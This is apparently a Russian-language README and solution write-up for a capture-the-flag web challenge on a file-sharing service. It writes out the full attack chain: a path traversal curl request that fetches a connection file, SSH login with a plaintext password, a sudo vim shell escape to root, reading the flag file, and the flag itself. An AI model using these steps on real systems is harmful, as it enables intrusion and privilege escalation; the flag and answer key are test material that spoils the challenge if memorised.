# WebFileManager

Название задачи: В поисках сокровищ
Сложность: трудно
Категория: web/web-архитектура
Описание: Ты - исследователь цифровых архивов. На сервисе для обмена файлами появились странные метаданные и намёки, будто кто‑то оставил себе «ключ подключения». Твоя задача - найти «ключ подключения» (JSON‑файл), который позволит найти тебе клад в формате `CTF{...}`.

## Алгоритм решения

1) Регистрируем пользователя смотрим, что авторизация выполняется на Flask по токену. Замечаем два фото на первой странице регистрации и понимаем что это подсказка так как задача решается в два этапа. Смотрим html и видим, что первое фото имеет alt что это первый этап Path Traver (curl post), второй этап это классический способ повышения привилегий (privilege escalation) из обычного пользователя в root через sudo-права на запуск Vim.
2) curl -s -X GET "http://localhost:5000/download_vuln?name=../ctf/connection.json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc2MzczNDEyOSwianRpIjoiMzRkODlkODctMzY3ZS00MWEzLTg1MGMtODBkNTA2NDExNTRlIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6Ijg1NWQ5NjJlLWY0YzUtNDc2Yy05YTRmLWRkNTdhZjM0MjYxNSIsIm5iZiI6MTc2MzczNDEyOSwiY3NyZiI6IjU0MDdjMjlhLTQzOTctNDk0OC04OGNlLWE0MzhkYjBlZjcwOSIsImV4cCI6MTc2MzgyMDUyOX0.YBgIOkxHXNzcNm8r6Vrqtn9Xof6jkXKW3zuwjhQR-Nk"
3) ssh ctf@127.0.0.1 -p 5073 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ПОРОЛЬ ОТ SSH :ctfpasswordssh ctf@127.0.0.1 -p 5073 Пароль: ctfpassword
4) sudo /usr/bin/vim -c ':!bash'
5) whoami (Вывод root)
6) cat /root/flag.txt
7) Флаг:  CTF{CL4D_SH4L1N4_ROM4N4_N41DEN}

## Инструкция по запуску

### Запуск

```docker-compose down -v --remove-orphants && docker-compose build --no-cache && docker-compose up -d --force-recreate```

Работает локально надо менять пути
